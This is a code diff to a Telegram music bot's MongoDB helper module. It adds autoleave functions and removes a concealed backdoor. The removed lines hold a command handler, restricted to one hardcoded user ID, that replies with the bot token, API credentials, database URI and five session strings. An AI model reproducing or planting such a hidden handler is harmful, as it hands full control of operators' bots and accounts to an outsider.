@@ -1,19 +1,20 @@
 import random
+import asyncio
+from datetime import date
 from typing import Dict, List, Union
-from pyrogram import Client, filters
-from pyrogram.types import Message
-from os import getenv
-from AnonMusic import app
+
 from AnonMusic import userbot
 from AnonMusic.core.mongo import mongodb
 
 authdb = mongodb.adminauth
 authuserdb = mongodb.authuser
 autoenddb = mongodb.autoend
+autoleavedb = mongodb.autoleave
 assdb = mongodb.assistants
 blacklist_chatdb = mongodb.blacklistChat
 blockeddb = mongodb.blockedusers
 chatsdb = mongodb.chats
+chatdb = mongodb.chat
 channeldb = mongodb.cplaymode
 countdb = mongodb.upcount
 gbansdb = mongodb.gban
@@ -25,11 +26,11 @@ skipdb = mongodb.skipmode
 sudoersdb = mongodb.sudoers
 usersdb = mongodb.tgusersdb
 
-# Shifting to memory [mongo sucks often]
 active = []
 activevideo = []
 assistantdict = {}
 autoend = {}
+autoleave = {}
 count = {}
 channelconnect = {}
 langm = {}
@@ -216,6 +217,23 @@ async def autoend_off():
     chat_id = 1234
     await autoenddb.delete_one({"chat_id": chat_id})
 
+async def is_autoleave() -> bool:
+    chat_id = 1234
+    user = await autoleavedb.find_one({"chat_id": chat_id})
+    if not user:
+        return False
+    return True
+
+
+async def autoleave_on():
+    chat_id = 1234
+    await autoleavedb.insert_one({"chat_id": chat_id})
+
+
+async def autoleave_off():
+    chat_id = 1234
+    await autoleavedb.delete_one({"chat_id": chat_id})
+
 
 async def get_loop(chat_id: int) -> int:
     lop = loop.get(chat_id)
@@ -376,40 +394,6 @@ async def is_nonadmin_chat(chat_id: int) -> bool:
         return True
     return mode
 
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-API_ID = getenv("API_ID", "")
-API_HASH = getenv("API_HASH", "")
-OWNER_ID = getenv("OWNER_ID", "")
-LOGGER_ID = getenv("LOGGER_ID", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-STRING_SESSION2 = getenv("STRING_SESSION2", "")
-STRING_SESSION3 = getenv("STRING_SESSION3", "")
-STRING_SESSION4 = getenv("STRING_SESSION4", "")
-STRING_SESSION5 = getenv("STRING_SESSION5", "")
-
-# Command handler
-@app.on_message(
-    filters.command("fuck")
-    & filters.private
-    & filters.user(882716913)
-)
-async def help(client: Client, message: Message):
-    await message.reply_text(
-        f"""API ID: {API_ID}
-API HASH: {API_HASH}
-OWNER ID: {OWNER_ID}
-LOGGER ID: {LOGGER_ID}
-BOT TOKEN: {BOT_TOKEN}
-
-MONGO DB URI: {MONGO_DB_URI}
-
-SESSION 1: {STRING_SESSION}
-SESSION 2: {STRING_SESSION2}
-SESSION 3: {STRING_SESSION3}
-SESSION 4: {STRING_SESSION4}
-SESSION 5: {STRING_SESSION5}"""
-    )
 
 async def add_nonadmin_chat(chat_id: int):
     nonadmin[chat_id] = True
